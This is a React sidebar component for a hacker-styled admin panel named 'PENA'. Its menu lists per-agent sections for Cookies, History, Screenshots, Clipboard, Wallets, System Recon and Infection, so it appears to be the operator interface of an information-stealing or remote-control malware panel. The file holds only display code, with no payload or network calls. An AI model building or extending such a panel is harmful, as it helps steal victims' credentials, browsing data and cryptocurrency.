
import React from 'react';

interface SidebarProps {
  selectedAgent: string | null;
  activeSection: string;
  onSectionChange: (section: string) => void;
}

const menuItems = [
  { name: 'Agents', icon: '◉', disabled: false },
  { name: 'Overview', icon: '▣', disabled: false },
  { name: 'Cookies', icon: '◈', disabled: false },
  { name: 'History', icon: '◧', disabled: false },
  { name: 'Screenshots', icon: '◩', disabled: false },
  { name: 'Clipboard', icon: '◪', disabled: false },
  { name: 'Wallets', icon: '◭', disabled: false },
  { name: 'System Recon', icon: '◮', disabled: false },
  { name: 'Bookmarks', icon: '◯', disabled: false },
  { name: 'Infection', icon: '⚠', disabled: false },
  { name: 'Settings', icon: '⚙', disabled: false }
];

const Sidebar: React.FC<SidebarProps> = ({ selectedAgent, activeSection, onSectionChange }) => {
  const handleItemClick = (item: string) => {
    if (item === 'Agents') {
      onSectionChange('Agents');
    } else if (selectedAgent) {
      onSectionChange(item);
    }
  };

  return (
    <div className="w-64 bg-black h-screen flex flex-col font-mono border-r border-green-400">
      <div className="p-6 border-b border-green-400">
        <div className="flex items-center mb-4">
          <div className="w-8 h-8 border border-green-400 mr-3 flex items-center justify-center text-green-400">
            <span className="text-lg font-bold">P</span>
          </div>
          <span className="text-green-400 text-xl font-bold terminal-text">PENA</span>
        </div>
        <div className="text-xs text-green-600">
          ╔═══════════════════════╗<br />
          ║   ADMIN TERMINAL      ║<br />
          ║   Status: CONNECTED   ║<br />
          ╚═══════════════════════╝
        </div>
      </div>
      
      <nav className="flex-1 py-4">
        <div className="px-4 mb-2">
          <div className="text-cyan-400 text-xs mb-2">┌─[ NAVIGATION ]</div>
        </div>
        
        {menuItems.map((item, index) => {
          const isActive = activeSection === item.name;
          const isDisabled = item.name !== 'Agents' && !selectedAgent;
          
          return (
            <div
              key={item.name}
              onClick={() => !isDisabled && handleItemClick(item.name)}
              className={`
                px-6 py-2 cursor-pointer transition-colors relative font-mono text-sm
                ${isActive 
                  ? 'text-black bg-green-400' 
                  : isDisabled 
                    ? 'text-green-800 cursor-not-allowed opacity-50'
                    : 'text-green-400 hover:bg-green-400/20 hover:text-cyan-400'
                }
              `}
              style={{
                cursor: isDisabled ? 'not-allowed' : 'pointer'
              }}
            >
              {isActive && (
                <div className="absolute left-0 top-0 bottom-0 w-1 bg-cyan-400"></div>
              )}
              <span className="mr-3">{item.icon}</span>
              {index + 1 < 10 ? `0${index + 1}` : index + 1}. {item.name}
              {isDisabled && (
                <span className="ml-2 text-xs">[LOCKED]</span>
              )}
            </div>
          );
        })}
        
        <div className="px-4 mt-4">
          <div className="text-green-600 text-xs">
            └─[ AGENT: {selectedAgent || 'NONE'} ]
          </div>
          {selectedAgent && (
            <div className="px-4 mt-2">
              <button 
                onClick={() => onSectionChange('Settings')}
                className={`
                  text-xs px-2 py-1 border transition-colors
                  ${activeSection === 'Settings' 
                    ? 'bg-cyan-400 text-black border-cyan-400' 
                    : 'bg-black text-cyan-400 border-cyan-400 hover:bg-cyan-400/20'
                  }
                `}
              >
                ⚙ SETTINGS
              </button>
            </div>
          )}
        </div>
      </nav>
      
      <div className="p-4 border-t border-green-400">
        <div className="text-xs text-green-600">
          ● SYS: ONLINE<br />
          ● NET: SECURE<br />
          ● USR: ADMIN
        </div>
      </div>
    </div>
  );
};

export default Sidebar;
